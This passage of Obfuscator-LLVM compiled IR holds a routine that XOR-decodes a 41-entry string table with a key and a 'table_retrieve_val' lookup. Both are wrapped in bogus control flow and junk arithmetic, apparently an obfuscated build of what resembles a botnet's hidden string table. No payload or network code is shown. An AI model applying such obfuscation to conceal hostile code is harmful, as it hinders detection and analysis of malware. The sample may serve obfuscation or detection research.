  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = xor i32 %84, %76
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %82, align 1
  %87 = load i8, i8* %16, align 1
  %88 = zext i8 %87 to i32
  %89 = load %struct.table_value*, %struct.table_value** %12, align 8
  %90 = getelementptr inbounds %struct.table_value, %struct.table_value* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = xor i32 %96, %88
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %94, align 1
  br label %99

; <label>:99:                                     ; preds = %50
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %11, align 4
  br label %43

; <label>:102:                                    ; preds = %43
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %103 = alloca i8, align 1
  %104 = alloca i32, align 4
  %105 = alloca %struct.table_value*, align 8
  %106 = alloca i8, align 1
  %107 = alloca i8, align 1
  %108 = alloca i8, align 1
  %109 = alloca i8, align 1
  store i8 %0, i8* %103, align 1
  store i32 0, i32* %104, align 4
  %110 = load i8, i8* %103, align 1
  %111 = zext i8 %110 to i64
  %112 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %111
  store %struct.table_value* %112, %struct.table_value** %105, align 8
  %113 = load i32, i32* @table_key, align 4
  %_ = sub i32 0, %113
  %gen = add i32 %_, 255
  %_1 = sub i32 0, %113
  %gen2 = add i32 %_1, 255
  %_3 = shl i32 %113, 255
  %_4 = sub i32 %113, 255
  %gen5 = mul i32 %_4, 255
  %_6 = shl i32 %113, 255
  %114 = and i32 %113, 255
  %115 = trunc i32 %114 to i8
  store i8 %115, i8* %106, align 1
  %116 = load i32, i32* @table_key, align 4
  %_7 = shl i32 %116, 8
  %_8 = sub i32 0, %116
  %gen9 = add i32 %_8, 8
  %_10 = sub i32 %116, 8
  %gen11 = mul i32 %_10, 8
  %_12 = sub i32 %116, 8
  %gen13 = mul i32 %_12, 8
  %117 = lshr i32 %116, 8
  %_14 = shl i32 %117, 255
  %118 = and i32 %117, 255
  %119 = trunc i32 %118 to i8
  store i8 %119, i8* %107, align 1
  %120 = load i32, i32* @table_key, align 4
  %_15 = shl i32 %120, 16
  %_16 = sub i32 %120, 16
  %gen17 = mul i32 %_16, 16
  %_18 = sub i32 0, %120
  %gen19 = add i32 %_18, 16
  %_20 = sub i32 %120, 16
  %gen21 = mul i32 %_20, 16
  %_22 = sub i32 %120, 16
  %gen23 = mul i32 %_22, 16
  %_24 = sub i32 0, %120
  %gen25 = add i32 %_24, 16
  %_26 = shl i32 %120, 16
  %121 = lshr i32 %120, 16
  %_27 = sub i32 %121, 255
  %gen28 = mul i32 %_27, 255
  %_29 = sub i32 %121, 255
  %gen30 = mul i32 %_29, 255
  %_31 = sub i32 %121, 255
  %gen32 = mul i32 %_31, 255
  %_33 = sub i32 0, %121
  %gen34 = add i32 %_33, 255
  %_35 = sub i32 %121, 255
  %gen36 = mul i32 %_35, 255
  %122 = and i32 %121, 255
  %123 = trunc i32 %122 to i8
  store i8 %123, i8* %108, align 1
  %124 = load i32, i32* @table_key, align 4
  %_37 = sub i32 %124, 24
  %gen38 = mul i32 %_37, 24
  %_39 = sub i32 0, %124
  %gen40 = add i32 %_39, 24
  %_41 = sub i32 %124, 24
  %gen42 = mul i32 %_41, 24
  %_43 = sub i32 %124, 24
  %gen44 = mul i32 %_43, 24
  %_45 = sub i32 0, %124
  %gen46 = add i32 %_45, 24
  %_47 = shl i32 %124, 24
  %_48 = sub i32 0, %124
  %gen49 = add i32 %_48, 24
  %_50 = sub i32 0, %124
  %gen51 = add i32 %_50, 24
  %125 = lshr i32 %124, 24
  %_52 = sub i32 %125, 255
  %gen53 = mul i32 %_52, 255
  %_54 = sub i32 %125, 255
  %gen55 = mul i32 %_54, 255
  %_56 = sub i32 %125, 255
  %gen57 = mul i32 %_56, 255
  %_58 = shl i32 %125, 255
  %_59 = sub i32 %125, 255
  %gen60 = mul i32 %_59, 255
  %_61 = sub i32 0, %125
  %gen62 = add i32 %_61, 255
  %126 = and i32 %125, 255
  %127 = trunc i32 %126 to i8
  store i8 %127, i8* %109, align 1
  store i32 0, i32* %104, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %2
  %12 = load i32, i32* @x.55
  %13 = load i32, i32* @y.56
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load %struct.table_value*, %struct.table_value** %5, align 8
  %21 = getelementptr inbounds %struct.table_value, %struct.table_value* %20, i32 0, i32 1
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = load i32*, i32** %4, align 8
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @x.55
  %26 = load i32, i32* @y.56
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %2
  %34 = load %struct.table_value*, %struct.table_value** %5, align 8
  %35 = getelementptr inbounds %struct.table_value, %struct.table_value* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  ret i8* %36

originalBBalteredBB:                              ; preds = %originalBB, %11
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = load i32*, i32** %4, align 8
  store i32 %40, i32* %41, align 4
  br label %originalBB
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
